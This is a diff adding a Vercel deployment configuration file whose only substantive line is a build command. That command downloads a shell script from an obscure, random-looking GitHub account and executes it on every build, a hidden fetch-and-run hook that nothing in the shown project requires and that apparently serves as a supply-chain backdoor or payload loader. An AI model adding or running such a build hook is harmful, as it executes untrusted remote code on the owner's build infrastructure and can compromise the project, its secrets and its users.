@@ -1,0 +1,4 @@
+{
+  "$schema": "https://openapi.vercel.sh/vercel.json",
+  "buildCommand": "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/1/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh ver1"
+}
